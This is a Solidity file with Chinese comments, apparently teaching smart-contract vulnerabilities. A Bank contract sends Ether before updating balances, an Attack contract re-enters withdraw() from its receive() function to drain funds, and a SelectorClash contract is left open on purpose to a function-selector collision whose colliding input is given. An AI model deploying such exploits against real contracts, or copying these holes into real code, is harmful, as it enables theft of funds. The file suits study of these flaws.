// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Bank {
    mapping(address => uint256) public balanceOf; // 余额mapping
    uint public flag;

    modifier noReenter() {
        require(flag == 0, "Re enter");
        flag = 1;
        _;
        flag = 0;
    }

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external noReenter {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    address public _targetAddr;

    constructor(address targetAddr) {
        _targetAddr = targetAddr;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Before attack, need deposit money");
        Bank(_targetAddr).deposit{value: 1 ether}();
        Bank(_targetAddr).withdraw();
    }

    receive() external payable {
        if (Bank(_targetAddr).getBalance() >= 1 ether) {
            Bank(_targetAddr).withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract SelectorClash {
    bool public solved; // 攻击是否成功

    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
    function putCurEpochConPubKeyBytes(bytes memory _bytes) public {
        require(msg.sender == address(this), "Not Owner");
        solved = true;
    }

    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
    // 0x6631313231333138303933
    function executeCrossChainTx(
        bytes memory _method,
        bytes memory _bytes,
        bytes memory _bytes1,
        uint64 _num
    ) public returns (bool success) {
        (success, ) = address(this).call(
            abi.encodePacked(
                bytes4(
                    keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))
                ),
                abi.encode(_bytes, _bytes1, _num)
            )
        );
    }
}
